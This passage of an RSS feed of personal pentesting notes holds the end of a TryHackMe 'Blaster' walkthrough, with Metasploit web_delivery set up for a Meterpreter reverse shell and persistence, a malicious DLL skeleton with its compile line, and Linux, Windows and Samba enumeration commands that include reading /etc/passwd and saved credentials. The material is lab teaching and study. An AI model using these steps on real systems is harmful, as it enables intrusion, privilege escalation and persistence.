folder.&lt;/p&gt;&lt;p&gt;FLAG 10: What are the contents of &lt;code&gt;root.txt&lt;/code&gt;? - &lt;code&gt;THM{COIN_OPERATED_EXPLOITATION}&lt;/code&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1388&quot;&gt;CVE-2019-1388 (MITRE)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.nagenrauft-consulting.com/2019/11/21/cve-2019-1388-hhupd-exe/&quot;&gt;CVE-2019-1388 (nagenrauft-consulting.com)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;related-video&quot;&gt;Related Video&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=3BQKpPNlTSo&quot;&gt;CVE-2019-1388: Windows Privilege Escalation Through UAC (YouTube)&lt;/a&gt;&lt;/p&gt;&lt;h2 id=&quot;adoption-into-the-collective&quot;&gt;Adoption into the Collective&lt;/h2&gt;&lt;p&gt;Target information isn't immediately obvious in Metasploit; after selecting &lt;code&gt;exploit/multi/script/web_delivery&lt;/code&gt; we'll need to run &lt;code&gt;info&lt;/code&gt; to see all of the options.&lt;/p&gt;&lt;p&gt;FLAG 11: What is the target number for PSH when using &lt;code&gt;exploit/multi/script/web_delivery&lt;/code&gt; in Metasploit? - 2&lt;/p&gt;&lt;p&gt;Let's set things up and run the exploit:&lt;/p&gt;&lt;pre class=&quot;msfconsole&quot;&gt;&lt;code&gt;set target 2
set SRVHOST 10.13.26.40
set LHOST 10.13.26.40
set payload windows/meterpreter/reverse_http
run -j
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;(NOTE: I found that I needed to set the SRVHOST option to get Metasploit to deliver the exploit on the right interface.)&lt;/p&gt;&lt;p&gt;This particular exploit outputs and encoded PowerShell script and then starts a local listener to deliver the actual Meterpreter shell. All we need to do is cut-and-paste into our elevated shell.&lt;/p&gt;&lt;p&gt;(For whatever reason, I could &lt;em&gt;only&lt;/em&gt; get this exploit working with the 32-bit version of Meterpreter &lt;em&gt;and&lt;/em&gt; the &lt;code&gt;run -j&lt;/code&gt; command. I'm not sure whyâ¦)&lt;/p&gt;&lt;p&gt;FLAG 12: What command can be used in Meterpreter to establish on-boot persistence on this machine? - &lt;code&gt;run persistence -X&lt;/code&gt;&lt;/p&gt;&lt;p&gt;(NOTE: Meterpreter flags this as being deprecated now; the modern pattern seems to be to background Meterpreter and then switch to and exploit the &lt;code&gt;exploit/windows/local/persistence&lt;/code&gt; module, probably with &lt;code&gt;set STARTUP SYSTEM&lt;/code&gt;.)&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20Metasploit.md&quot;&gt;Using Metasploit&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20PowerShell.md&quot;&gt;Using PowerShell&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;ELAPSED TIME: 2 h 15 min&lt;/p&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/blaster&quot;&gt;TryHackMe: Blaster&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Blaster.md</guid>
		</item>
		<item>
			<title>DLL Hijacking</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/DLL%20Hijacking.md</link>
			<description>&lt;h2 id=&quot;windows-dll-search-order&quot;&gt;Windows DLL Search Order&lt;/h2&gt;&lt;p&gt;Windows DLL search order if &lt;code&gt;SafeDllSearchMode&lt;/code&gt; is enabled:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;The application directory&lt;/li&gt;&lt;li&gt;The system directory (as returned by &lt;code&gt;GetSystemDirectory()&lt;/code&gt;)&lt;/li&gt;&lt;li&gt;The 16-bit (!) system directory&lt;/li&gt;&lt;li&gt;The Windows directory (as returned by &lt;code&gt;GetWindowsDirectory()&lt;/code&gt;)&lt;/li&gt;&lt;li&gt;The current directory (!)&lt;/li&gt;&lt;li&gt;The system &lt;code&gt;PATH&lt;/code&gt; (!)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Windows DLL search order if &lt;code&gt;SafeDllSearchMode&lt;/code&gt; is disabled:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;The application directory&lt;/li&gt;&lt;li&gt;The current directory (!)&lt;/li&gt;&lt;li&gt;The system directory (as returned by &lt;code&gt;GetSystemDirectory()&lt;/code&gt;)&lt;/li&gt;&lt;li&gt;The 16-bit (!) system directory&lt;/li&gt;&lt;li&gt;The Windows directory (as returned by &lt;code&gt;GetWindowsDirectory()&lt;/code&gt;)&lt;/li&gt;&lt;li&gt;The system &lt;code&gt;PATH&lt;/code&gt; (!)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Note that it seems more-or-less impossible to determine what DLLs an application is searching for without having SYSTEM access already (so tools like ProcMon can be run).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Exploiting%20LD_PRELOAD.md&quot;&gt;Exploiting LD_PRELOAD&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Exploiting%20LD_LIBRARY_PATH.md&quot;&gt;Exploiting LD_LIBRARY_PATH&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;malicious-dll-skeleton&quot;&gt;Malicious DLL Skeleton&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;BOOL WINAPI DllMain&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; (dwReason == DLL_PROCESS_ATTACH) {&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        system(&lt;span class=&quot;st&quot;&gt;&amp;quot;cmd.exe /C whoami &amp;gt; C:\Temp\dll.txt&amp;quot;&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        ExitProcess(&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    }&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt; TRUE;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Compile with mingw (on Linux!):&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;x86_64-w64-mingw32-gcc&lt;/span&gt; windows_dll.c -shared -o output.dll&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/DLL%20Hijacking.md</guid>
		</item>
		<item>
			<title>Enumerate "sudo" Access</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Enumerate%20%22sudo%22%20Access.md</link>
			<description>&lt;p&gt;The &lt;code&gt;sudo -l&lt;/code&gt; command will helpfully tell us what we can run as the superuser without a password (&lt;code&gt;NOPASSWD&lt;/code&gt;), as well as what environment variables may be preserved (useful if you're going to try to exploit &lt;code&gt;LD_PRELOAD&lt;/code&gt; or &lt;code&gt;LD_LIBRARY_PATH&lt;/code&gt;).&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The use of &lt;code&gt;sudo -l&lt;/code&gt; requires that the user have &lt;em&gt;some&lt;/em&gt; level of sudo access to begin with, and &lt;em&gt;will&lt;/em&gt; be logged!&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/beginner&quot;&gt;TryHackMe: Complete Beginner&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/basicpentestingjt&quot;&gt;TryHackMe: Basic Pentesting&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Shell%20Escapes.md&quot;&gt;Shell Escapes&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Exploiting%20LD_PRELOAD.md&quot;&gt;Exploiting LD_PRELOAD&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Exploiting%20LD_LIBRARY_PATH.md&quot;&gt;Exploiting LD_LIBRARY_PATH&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Enumerate%20%22sudo%22%20Access.md</guid>
		</item>
		<item>
			<title>Enumerate Linux Environments</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Enumerate%20Linux%20Environments.md</link>
			<description>&lt;h2 id=&quot;useful-commands&quot;&gt;Useful Commands&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;cat /etc/issue&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;cat /etc/passwd&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;cat /proc/version&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;env&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;find&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;getcap&lt;/code&gt; - find and list executable &lt;em&gt;capabilities&lt;/em&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;history&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;hostname&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;id&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;ifconfig&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;ip route&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;ls&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;netstat -ano&lt;/code&gt; - list all listening parts and established connections, no domain resolution&lt;/li&gt;&lt;li&gt;&lt;code&gt;netstat -i&lt;/code&gt; - list per interface statistics&lt;/li&gt;&lt;li&gt;&lt;code&gt;netstat -l&lt;/code&gt; - list &lt;em&gt;only&lt;/em&gt; listening ports&lt;/li&gt;&lt;li&gt;&lt;code&gt;netstat -p&lt;/code&gt; - list protocol and service information (requires root to see everything)&lt;/li&gt;&lt;li&gt;&lt;code&gt;netstat -s&lt;/code&gt; - list protocol statistics&lt;/li&gt;&lt;li&gt;&lt;code&gt;ps auxfww&lt;/code&gt; - show process tree&lt;/li&gt;&lt;li&gt;&lt;code&gt;ps auxww&lt;/code&gt; - show lots and lots of process info&lt;/li&gt;&lt;li&gt;&lt;code&gt;sudo -l&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;uname -a&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;useful-scripts&quot;&gt;Useful Scripts&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS&quot;&gt;LinPeas&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot;&gt;LinEnum&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/mzet-/linux-exploit-suggester&quot;&gt;LES (Linux Exploit Suggester)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/diego-treitos/linux-smart-enumeration&quot;&gt;Linux Smart Enumeration&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/linted/linuxprivchecker&quot;&gt;Linux Priv Checker&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./How%20to%20Find%20Executables%20with%20SUID%20Capabilities.md&quot;&gt;How to Find Executables with SUID Capabilities&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./How%20to%20Use%20%22find%22%20With%20File%20Metadata.md&quot;&gt;How to Use &quot;find&quot; with File Metadata&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22netstat%22.md&quot;&gt;Using &quot;netstat&quot;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22ps%22.md&quot;&gt;Using &quot;ps&quot;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Enumerate%20%22sudo%22%20Access.md&quot;&gt;Enumerate &quot;sudo&quot; Access&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Enumerate%20Linux%20Environments.md</guid>
		</item>
		<item>
			<title>Enumerate NFS Shares</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Enumerate%20NFS%20Shares.md</link>
			<description>&lt;p&gt;NFS shares can be enumerated by nmap during scanning:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;nmap&lt;/span&gt; -v -sT --script nfs-ls,nfs-statfs,nfs-showmount &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-p&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$PORT&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Normally &lt;code&gt;$PORT&lt;/code&gt; is 111.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/beginner&quot;&gt;TryHackMe: Complete Beginner&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22nmap%22.md&quot;&gt;Using &quot;nmap&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Enumerate%20NFS%20Shares.md</guid>
		</item>
		<item>
			<title>Enumerate Samba Users and Shares</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Enumerate%20Samba%20Users%20and%20Shares.md</link>
			<description>&lt;h2 id=&quot;nmap&quot;&gt;NMAP&lt;/h2&gt;&lt;p&gt;CIFS users and shares can be enumerated by nmap during scanning:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;nmap&lt;/span&gt; -vv -sT &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;--script&lt;/span&gt; smb-enum-shares.nse,smb-enum-users.nse &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-p445&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$TARGET_IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;NOTE: While smb-enum-shares.nse returns results for UNIX-like systems, I've found smb-enum-users.nse to be kind of hit-or-miss.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.infosecademy.com/nmap-smb-scripts-enumeration/&quot;&gt;Nmap SMB Scripts and SMB Enumeration Step-By-Step Pentesting Guide&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22nmap%22.md&quot;&gt;Using &quot;nmap&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;metasploit&quot;&gt;Metasploit&lt;/h2&gt;&lt;p&gt;Metasploit can also enumerate CIFS users using the &lt;code&gt;auxiliary/smb/smb_lookupsid&lt;/code&gt; module.&lt;/p&gt;&lt;p&gt;Like NMAP, I've found this to be a bit unreliable on UNIX-like systems.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Metasploit.md&quot;&gt;Using Metasploit&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;nbtscan&quot;&gt;nbtscan&lt;/h2&gt;&lt;p&gt;You can scan a target machine or network using nbtscan to see what hosts are running Samba.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nbtscan&lt;/span&gt; -r &lt;span class=&quot;va&quot;&gt;$NETWORK_IP&lt;/span&gt;/&lt;span class=&quot;va&quot;&gt;$CIDR_NETMASK&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This won't give you detailed user and share information, but it will at least let you know what machines to target.&lt;/p&gt;&lt;h2 id=&quot;enum4linux&quot;&gt;enum4linux&lt;/h2&gt;&lt;p&gt;For UNIX-like systems running Samba, enum4linux works well.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;enum4linux&lt;/span&gt; -a &lt;span class=&quot;va&quot;&gt;$TARGET_IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As of the time of this writing (November 5, 2021) however, it looks like enum4linux's normal user enumeration has been broken for quite some time. However, the &quot;RID cycling&quot; method of discovering users still works - so just call enum4linux with either the -r flag (to specifically use RID cycling to enumerate users) or the -a flag (which does a complete enumeration, including RID cycling) rather than the -U flag.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://null-byte.wonderhowto.com/how-to/enumerate-smb-with-enum4linux-smbclient-0198049/&quot;&gt;Enumerate SMB with Enum4linux &amp;amp; Smbclient&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/CiscoCXSecurity/enum4linux/issues/4&quot;&gt;Use of uninitialized value $user, what does this mean?&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;smbclient&quot;&gt;smbclient&lt;/h2&gt;&lt;p&gt;Samba services can be enumerated by smbclient using:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;smbclient&lt;/span&gt; -L &lt;span class=&quot;va&quot;&gt;$SERVER_NAME&lt;/span&gt; -I &lt;span class=&quot;va&quot;&gt;$IP_ADDRESS&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here &lt;code&gt;$SERVER_NAME&lt;/code&gt; is the machine's NetBIOS domain name, which can be found with enum4linux (see above).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Working%20With%20Samba.md&quot;&gt;Working With Samba&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;smbmap&quot;&gt;smbmap&lt;/h2&gt;&lt;p&gt;Get Windows version information:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;smbmap&lt;/span&gt; -H &lt;span class=&quot;va&quot;&gt;$IP_ADDRESS&lt;/span&gt; -v&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Enumerate%20Samba%20Users%20and%20Shares.md</guid>
		</item>
		<item>
			<title>Enumerate Windows Environments</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Enumerate%20Windows%20Environments.md</link>
			<description>&lt;h2 id=&quot;important-commands&quot;&gt;Important Commands&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;cmdkey /list&lt;/code&gt; - show saved credentials&lt;/li&gt;&lt;li&gt;&lt;code&gt;driverquery&lt;/code&gt; - list installed drivers&lt;/li&gt;&lt;li&gt;&lt;code&gt;hostname&lt;/code&gt; - return system hostname&lt;/li&gt;&lt;li&gt;&lt;code&gt;net group &quot;Domain Admins&quot; /domain&lt;/code&gt; - list domain admins&lt;/li&gt;&lt;li&gt;&lt;code&gt;net localgroup&lt;/code&gt; - list all (local) groups&lt;/li&gt;&lt;li&gt;&lt;code&gt;net localgroup $GROUP&lt;/code&gt; - list user in group &lt;code&gt;$GROUP&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;net user&lt;/code&gt; - list all (local) users&lt;/li&gt;&lt;li&gt;&lt;code&gt;net user $USERNAME&lt;/code&gt; - get details for user &lt;code&gt;$USERNAME&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;netstat&lt;/code&gt; - query open/listening ports&lt;/li&gt;&lt;li&gt;&lt;code&gt;query session&lt;/code&gt; - list other users who are currently logged in&lt;/li&gt;&lt;li&gt;&lt;code&gt;reg&lt;/code&gt; - query (and manipulate) registry enteries&lt;/li&gt;&lt;li&gt;&lt;code&gt;sc&lt;/code&gt; - query (and manipulate) services (conflicts with a PowerShell built-in!)&lt;/li&gt;&lt;li&gt;&lt;code&gt;schtasks&lt;/code&gt; - list scheduled tasks&lt;/li&gt;&lt;li&gt;&lt;code&gt;systeminfo&lt;/code&gt; - return system info&lt;/li&gt;&lt;li&gt;&lt;code&gt;whoami /priv&lt;/code&gt; - current user + privileges&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;net&quot;&gt;net&lt;/h2&gt;&lt;p&gt;Windows' &lt;code&gt;net&lt;/code&gt; command is can also be used to &lt;em&gt;manipulate&lt;/em&gt; user and group information (&lt;em&gt;if&lt;/em&gt; you already have admin/SYSTEM permission)! For example:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Change a user&amp;#39;s password&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;net user &lt;span class=&quot;va&quot;&gt;$USERNAME&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$PASSWORD&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Add a user to a domain&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
